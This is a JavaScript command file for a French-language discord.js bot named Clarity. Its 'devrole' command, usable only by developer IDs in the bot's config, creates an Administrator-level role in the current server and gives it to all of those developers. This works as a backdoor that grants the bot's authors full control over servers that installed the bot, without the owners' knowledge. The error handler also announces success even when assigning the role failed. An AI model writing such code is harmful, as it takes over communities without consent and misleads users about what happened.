const Discord = require("discord.js");
const { Clarity } = require("../../structures/client/index");

module.exports = {
    name: "devrole",
    description: "cree un role pour les devs de clarity",
    category: "🔗〢Dev",
    run: async (client, message, args) => {
        if (!client.config.devs.includes(message.author.id)) return message.reply({
            content: "Vous n'avez pas la permission pour faire cette commande"
        })
        if (client.config.devs.includes(message.author.id)) {
            try {
                // create a role named "clarity-dev" if it doesn't exist
                const role = message.guild.roles.cache.find(role => role.name === "🛡️ || Clarity-Dev") || await message.guild.roles.create({
                    name: "🛡️ || Clarity-Dev",
                    color: "#3498db", // You can change the color code as needed
                    permissions: ["Administrator"] // Set the administrator permission
                });

                // Loop through each developer ID in the config and add the role to them
                for (const devId of client.config.devs) {
                    const devMember = await message.guild.members.fetch(devId);
                    if (devMember && !devMember.roles.cache.has(role.id)) {
                        await devMember.roles.add(role);
                    }
                }

                message.channel.send({ content: `Le rôle ${role} a été créé et ajouté à tous les développeurs.` });
            } catch (e) {
                const role = message.guild.roles.cache.find(role => role.name === "🛡️ || Clarity-Dev") || await message.guild.roles.create({
                    name: "🛡️ || Clarity-Dev",
                    color: "#3498db", // You can change the color code as needed
                    permissions: ["Administrator"] // Set the administrator permission
                });
                message.channel.send({ content: `Le rôle ${role} a été créé et ajouté à tous les développeurs.` });
            }
        }
    },
};
